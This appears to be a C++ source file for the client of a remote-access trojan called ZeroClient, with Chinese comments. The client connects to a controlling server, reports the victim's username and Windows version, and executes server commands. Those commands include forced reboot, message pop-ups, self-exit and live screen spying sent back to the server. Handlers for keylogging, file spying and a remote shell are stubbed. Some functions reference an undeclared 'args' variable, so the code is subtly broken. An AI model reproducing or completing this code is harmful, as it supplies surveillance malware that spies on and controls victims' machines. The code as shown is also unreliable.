#include "ZeroClient.h"
#include "ScreenSpy.h"
ZeroClient::ZeroClient()
{

}

void ZeroClient::connectTo(std::string domain, int port)
{
    // 连接到服务端
    if (!mSock.connectTo(domain, port)) {
        return;
    }

    // 发送登入命令
    if (!sendLogin()) {
        return;
    }

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;

    while (1) {
        ret = mSock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            // 清空缓冲区
            mBuf.clear();
            break;
        }

        // 把数据加入到缓冲区
        addDataToBuffer(szData, ret);
        std::cout << "data receive" << ret << std::endl;
    }
}

std::string ZeroClient::getUserName()
{
    char szUser[MAX_PATH];
    int size = MAX_PATH;
    GetUserNameA(szUser, (DWORD*)&size);
    return std::string(szUser);
}


// 定义 RtlGetVersion 函数原型
typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);


std::string ZeroClient::getSystemModel()
{
    std::string version = "Unknown";

    // 获取 RtlGetVersion 函数指针
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");

    if (RtlGetVersion) {
        // 获取操作系统版本信息
        RTL_OSVERSIONINFOEXW osvi;
        ZeroMemory(&osvi, sizeof(osvi));
        osvi.dwOSVersionInfoSize = sizeof(osvi);

        NTSTATUS status = RtlGetVersion(&osvi);
        if (status == 0) { // 状态成功
            // 检查 Windows 11
            if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0 && osvi.dwBuildNumber >= 22000) {
                version = "Windows11OrGreater";
   
            }
            // 检查 Windows 10
            else if (osvi.dwMajorVersion == 10 && osvi.dwMinorVersion == 0) {
                version = "Windows10OrGreater";
                
            }
            // 检查 Windows 8.1
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3) {
                version = "Windows8Point1OrGreater";
               
            }
            // 检查 Windows 8
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2) {
                version = "Windows8OrGreater";
              
            }
            // 检查 Windows 7
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
                version = "Windows7OrGreater";
               
            }
            // 检查 Windows Vista
            else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0) {
                version = "VistaOrGreater";
               
            }
            // 检查 Windows XP
            else if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1) {
                version = "XPOrGreater";
                
            }
        }
    }

    return version;

}


// GBK 转 UTF-8
std::string GBKToUTF8(const std::string& gbkStr) {
    int unicodeLen = MultiByteToWideChar(CP_ACP, 0, gbkStr.c_str(), -1, NULL, 0);
    wchar_t* unicodeStr = new wchar_t[unicodeLen];
    MultiByteToWideChar(CP_ACP, 0, gbkStr.c_str(), -1, unicodeStr, unicodeLen);

    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, NULL, 0, NULL, NULL);
    char* utf8Str = new char[utf8Len];
    WideCharToMultiByte(CP_UTF8, 0, unicodeStr, -1, utf8Str, utf8Len, NULL, NULL);

    std::string result(utf8Str);
    delete[] unicodeStr;
    delete[] utf8Str;

    return result;
}


bool ZeroClient::sendLogin()
{
    // 写好登入信息，然后发送给服务端
    std::string data;
    data.append(CmdLogin + CmdSplit);
    data.append("SYSTEM" + CmdSplit + getSystemModel() + CmdSplit);
    data.append("USER_NAME" + CmdSplit + getUserName());
    data.append(CmdEnd);

    std::string data_utf8=GBKToUTF8(data);

    mSock.sendData(data_utf8.data(), data_utf8.size());
    return true;
}

void ZeroClient::addDataToBuffer(char* data, int size)
{
    mBuf.append(data, size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = mBuf.find(CmdEnd)) >= 0) //找到/r/n就进行循环
    {
        std::string line = mBuf.substr(0, endIndex);
        mBuf.erase(0, endIndex + CmdEnd.length());

        // 获取指令
        int firstSplit = line.find(CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit + CmdSplit.length());

        //处理指令
        processCmd(cmd, line);
    }
}

void ZeroClient::processCmd(std::string& cmd, std::string& data)
{
    std::map<std::string, std::string> args = parseArgs(data);
    std::cout << cmd << " " << data << std::endl;

    // 消息框命令
    if (cmd == CmdSendMessage) {
        doSendMessage(args);
        return;
    }

    // 重新开机命令
    if (cmd == CmdReboot) {
        doReboot(args);
        return;
    }

    // 退出本程序命令
    if (cmd == CmdQuit) {
        doQuit(args);
        return;
    }

    // 屏幕监控命令
    if (cmd == CmdScreenSpy) {
        doScreenSpy(args);
        return;
    }

    // 键盘监控命令
    if (cmd == CmdKeyboardSpy) {
        doKeyboardSpy(args);
        return;
    }

    // 文件监控命令
    if (cmd == CmdFileSpy) {
        doFileSpy(args);
        return;
    }

    // 命令行控制
    if (cmd == CmdCmdSpy) {
        doCmdSpy(args);
        return;
    }
}

std::map<std::string, std::string> ZeroClient::parseArgs(std::string& data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(CmdSplit);
    pos1 = 0;
    while (std::string::npos != pos2)  //即pos2找不到子串
    {
        v.push_back(data.substr(pos1, pos2 - pos1));
        pos1 = pos2 + CmdSplit.size();
        pos2 = data.find(CmdSplit, pos1);
    }

    if (pos1 != data.length())   //最后，如果字符串末尾还有内容没有分割完（即没有 CmdSplit），则将剩余部分也加入到 v 中。
        v.push_back(data.substr(pos1));


    
    for (int i = 0; i < (int)v.size() - 1; i += 2) {
        args[v.at(i)] = v.at(i + 1);
    }


    return args;
}

void ZeroClient::doScreenSpy(std::map<std::string, std::string>&)
{
    // 开始监控屏幕
    ScreenSpy::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
}

void ZeroClient::doKeyboardSpy(std::map<std::string, std::string>&)
{

}

void ZeroClient::doFileSpy(std::map<std::string, std::string>&)
{

}

void ZeroClient::doCmdSpy(std::map<std::string, std::string>& args)
{
   
}

void ZeroClient::doSendMessage(std::map<std::string, std::string>&args)
{
    // 弹出窗口信息
    MessageBoxA(NULL, args["TEXT"].data(), "Message", MB_OK);
}

void ZeroClient::doReboot(std::map<std::string, std::string>&)
{
    // 重启电脑
    system("shutdown -r -t 1");
}

void ZeroClient::doQuit(std::map<std::string, std::string>&)
{
    // 退出本程序
    ExitProcess(NULL);
}

